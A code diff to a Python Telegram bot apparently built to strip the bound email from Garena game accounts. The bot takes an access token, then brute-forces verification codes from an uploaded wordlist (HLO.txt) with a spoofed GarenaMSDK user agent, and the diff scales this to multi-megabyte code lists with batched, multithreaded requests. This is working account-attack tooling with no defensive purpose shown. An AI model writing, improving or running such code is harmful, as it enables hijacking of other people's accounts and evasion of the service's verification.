@@ -1,4 +1,4 @@
-# app.py
+# pass.py
 import os
 import hashlib
 import requests
@@ -41,12 +41,6 @@ def run_unbind_process(access_token):
     if not email:
         return "No bound email found or invalid access token provided."
 
-    try:
-        with open("HLO.txt", "r", encoding="utf-8", errors="ignore") as f:
-            codes = [line.strip() for line in f if line.strip()]
-    except Exception as e:
-        return f"Failed to read HLO.txt: {str(e)}"
-
     headers = {
         "User-Agent": "GarenaMSDK/4.0.30",
         "Content-Type": "application/x-www-form-urlencoded",
@@ -74,17 +68,42 @@ def run_unbind_process(access_token):
     identity_token = None
     matched_code = None
 
-    with ThreadPoolExecutor(max_workers=5) as executor:
-        futures = {executor.submit(test_single_code, code): code for code in codes}
-        
-        for future in as_completed(futures):
-            code, token = future.result()
-            if token:
-                matched_code = code
-                identity_token = token
-                for f in futures:
-                    f.cancel()
-                break
+    # Batch processing to handle large 6.7MB files without crashing server RAM
+    try:
+        with open("HLO.txt", "r", encoding="utf-8", errors="ignore") as f:
+            batch_size = 500
+            batch = []
+            
+            with ThreadPoolExecutor(max_workers=10) as executor:
+                for line in f:
+                    code = line.strip()
+                    if not code:
+                        continue
+                    batch.append(code)
+                    
+                    if len(batch) >= batch_size:
+                        futures = {executor.submit(test_single_code, c): c for c in batch}
+                        for future in as_completed(futures):
+                            c, token = future.result()
+                            if token:
+                                matched_code = c
+                                identity_token = token
+                                break
+                        if identity_token:
+                            break
+                        batch = []
+                
+                # Check remaining items in last batch
+                if batch and not identity_token:
+                    futures = {executor.submit(test_single_code, c): c for c in batch}
+                    for future in as_completed(futures):
+                        c, token = future.result()
+                        if token:
+                            matched_code = c
+                            identity_token = token
+                            break
+    except Exception as e:
+        return f"Error reading HLO.txt: {str(e)}"
 
     if not identity_token or not matched_code:
         return f"Verification failed! No code matched from HLO.txt for email: {email}"
@@ -118,11 +137,9 @@ def send_welcome(message):
 @bot.message_handler(content_types=['document'])
 def handle_docs(message):
     try:
-        # File info fetch karein
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         
-        # Server par HLO.txt ke naam se save kar dein
         with open("HLO.txt", 'wb') as new_file:
             new_file.write(downloaded_file)
             
@@ -152,4 +169,4 @@ if __name__ == '__main__':
         bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")
         
     app.run(host='0.0.0.0', port=PORT)
-    
+        
